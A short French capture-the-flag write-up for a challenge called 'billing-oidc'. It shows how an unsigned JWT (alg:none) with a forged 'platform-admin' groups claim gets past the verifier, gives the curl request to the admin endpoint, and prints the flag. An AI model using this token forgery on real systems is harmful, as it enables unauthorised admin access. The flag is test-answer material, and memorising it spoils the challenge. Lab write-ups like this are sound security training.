# billing-oidc (cloud, 498) — RÉSOLU

## Challenge
`/` → `{"token":"/token -> guest id_token","admin":"/admin/flag (Authorization: Bearer <id_token>)",
"need":"groups contains 'platform-admin'"}`.

## Exploit — JWT alg:none
- `/token` → id_token HS256 : header `{"alg":"HS256"}`, payload `{"sub":"guest","groups":["users"]}`.
- Le vérificateur accepte **alg:none** : forger header `{"alg":"none","typ":"JWT"}`,
  payload `{"sub":"guest","groups":["platform-admin"]}`, **signature vide** (`header.payload.`).
- `curl -H "Authorization: Bearer <forged>" /admin/flag` → flag.
  (les variantes `none`/`None`/`NONE` passent toutes.)

## Flag
`NCTF{3c2eb6b86860d8fa312cbfd1}`
